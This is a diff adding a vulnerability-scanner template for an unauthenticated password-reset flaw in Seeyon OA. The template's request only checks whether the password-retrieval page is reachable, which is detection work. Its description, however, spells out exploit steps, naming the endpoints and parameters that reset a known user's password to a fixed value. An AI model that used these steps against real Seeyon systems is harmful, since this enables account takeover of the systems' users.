@@ -1,0 +1,28 @@
+id: seeyon-oa-unauth-reset-passwd
+
+info:
+  name: Seeyon OA - Unauthenticated Password Reset
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Step 1 通过已知用户名进入到找回密码第二步选择验证方式
+    Step 2 访问接口，origin改为用户名 /seeyon/personalBind.do?method=sendVerificationCodeToBindNum&type=validate&origin=system
+    Step 3 访问接口，返回true则密码被重置为1qaz@WSX /seeyon/individualManager.do?method=resetPassword&nowpwd=1qaz@WSX
+  reference:
+    - https://github.com/wy876/POC/blob/17fce9e8a8e4c711753f586f24a2b8351f367aee/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9C%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9.md
+  tags: 致远互联-OA
+
+http:
+  - raw:
+      - |
+        GET /seeyon/personalBind.do?method=retrievePassword HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<title>找回密码</title>"
+      - type: status
+        status:
+          - 200
